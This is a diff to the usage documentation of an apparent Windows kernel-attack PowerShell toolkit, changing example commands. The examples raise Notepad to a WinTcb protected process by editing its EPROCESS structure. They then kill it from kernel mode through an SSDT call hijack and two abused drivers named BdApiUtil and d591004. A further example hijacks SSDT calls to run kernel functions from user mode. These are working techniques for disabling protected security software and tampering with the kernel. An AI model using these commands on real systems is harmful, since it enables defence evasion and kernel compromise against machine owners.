@@ -200,16 +200,18 @@ if ($null -ne $Eprocess) {
 ### 4. Terminate a Protected Process
 Elevate a process (e.g., Notepad) to `PP` (`WinTcb`) and demonstrate termination using a user-mode utility versus a kernel-mode driver command.
 ```powershell
-$processID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | select -ExpandProperty Id
-Query-EprocessStruct -ProcessID $ProcessID | % { Update-ProcessProtection -Eprocess $_ -SignerValue WinTcb -TypeValue PP } | Out-Null
+$PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | select -ExpandProperty Id
+$eProc  = Query-EprocessStruct -ProcessID $PROCID
+$eProc  | % { Update-ProcessProtection -Eprocess $_ -SignerValue WinTcb -TypeValue PP } | Out-Null
 # Ring 3 Kill
 Start-Sleep -Seconds 1
 tskill /a notepad
 # Ring 0 Kill
 Start-Sleep -Seconds 1
-Invoke-ShadowSsdtHookKill -PROCID $ProcessID
-Terminate-SystemProcess -ProcessID $ProcessID -DriverName BdApiUtil
-Terminate-KernelProcess -ProcID $ProcessID -Driver d591004
+
+Invoke-SsdtNtCallHijack -Function PsTerminateProcess -Values @($eProc)
+Terminate-SystemProcess -ProcessID $PROCID -DriverName BdApiUtil
+Terminate-KernelProcess -ProcID $PROCID    -Driver d591004
 ```
 
 ### 5. Duplicate a SYSTEM Process Token
@@ -300,12 +302,26 @@ Index ProcessName    PETHREAD_Address   ThreadID IsMainThread PreviousMode Previ
 ````
 ### 11. Ssdt Callback Hijack For Win32K, Ntoskrnl.exe
 hijack NT Kernel Address, And invoke it From user Mode, Work Only in build < 22000
-```powershell
+````powershell
 Clear-Host
 Write-Host
 
 $KernelVA = Get-KernelBaseAddress
 "VA: 0x{0:X16}" -f [Int64]$KernelVA
+
+$PA = Convert-VirtualToPhysical `
+    -VirtualAddress $KernelVA
+if ($PA -notin @(0,1)) {
+    "PA: 0x{0:X16}" -f $PA
+}
+
+$PA = Invoke-SsdtNtCallHijack `
+    -Function MmGetPhysicalAddress `
+    -Values @($KernelVA) `
+    -ReturnMode Int64
+if ($PA -notin @(0,1)) {
+    "PA: 0x{0:X16}" -f $PA
+}
 
 $Values = $KernelVA, 0L
 $PA = Invoke-SsdtCallbackHijack `
@@ -314,17 +330,10 @@ $PA = Invoke-SsdtCallbackHijack `
 if ($PA -notin @(0,1)) {
     "PA: 0x{0:X16}" -f $PA
 }
-$PA = Invoke-KernelCall `
-    -Function MmGetPhysicalAddress `
-    -Values @($KernelVA) `
-    -ReturnMode Int64
-if ($PA -notin @(0,1)) {
-    "PA: 0x{0:X16}" -f $PA
-}
 
 Write-Host
 return
-```
+````
 ### 12. Hardware-vs-Software-MemoryBridge
 A side-by-side comparison of manual page table walking versus standard API memory acquisition
 ```powershell
